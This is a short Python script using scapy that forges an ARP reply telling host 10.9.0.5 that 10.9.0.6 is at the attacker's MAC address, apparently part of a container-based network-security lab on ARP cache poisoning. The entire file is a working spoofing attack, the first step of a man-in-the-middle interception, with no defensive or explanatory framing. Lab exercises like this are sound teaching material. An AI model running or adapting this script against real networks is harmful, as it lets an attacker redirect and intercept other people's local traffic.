#!/usr/bin/env python3
from scapy.all import *

# Target (Host A)
target_ip = "10.9.0.5"
target_mac = "02:42:0a:09:00:05"

# Spoofed as Host B
spoofed_ip = "10.9.0.6"
attacker_mac = "02:42:0a:09:00:69"

# Construct ARP reply packet
packet = Ether(dst=target_mac) / \
         ARP(op=2,  # 2 = ARP reply
             hwsrc=attacker_mac, 
             psrc=spoofed_ip,
             hwdst=target_mac,
             pdst=target_ip)

# Send the packet
sendp(packet)
print(f"Sent ARP reply: {spoofed_ip} is at {attacker_mac}")
